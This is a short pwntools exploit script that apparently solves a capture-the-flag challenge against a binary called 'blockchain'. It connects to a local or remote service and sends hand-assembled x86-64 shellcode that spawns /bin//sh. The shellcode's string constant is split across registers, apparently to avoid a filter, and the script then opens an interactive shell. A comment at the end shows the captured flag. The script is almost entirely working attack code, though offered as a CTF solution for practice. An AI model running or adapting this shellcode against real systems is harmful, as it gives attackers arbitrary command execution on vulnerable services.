from pwn import *

HOST = args.HOST or '192.168.20.1'
PORT = int(args.PORT or 5280+5)
EXE_FILENAME = '../blockchain'

exe = context.binary = ELF(EXE_FILENAME)
argv = [EXE_FILENAME]
envp = {}

def start():
    if args.REMOTE:
        return remote(HOST,PORT)
    return process(argv=argv, env=envp)

"""
**Original reference code, same as smallcode_x64**
  xor rsi,rsi
  push rsi
  mov rdi,0x68732f2f6e69622f --> needs to be splitted
  push rdi
  push rsp
  pop rdi
  push 59
  pop rax
  cdq
  syscall
"""

io = start()
io.recvuntil(b'... ')

io.sendline(asm("""
  xor    rsi, rsi
  push   rsi
  nop
  mov    ebx, 0x6e69622f
  mov    eax, 0x68732f2f
  shl    rbx, 32
  nop
  shrd   rbx, rax, 32
  push   rbx
  push   rsp
  pop    rdi
  pushq  0x3b
  pop    rax
  cltd
  nop
  syscall
"""))

io.interactive()

'''
$ cat flag.txt
BASC{gr8_w0rK_s0_far_tH3_l4sT_ch4ll_aWa1t5}
'''
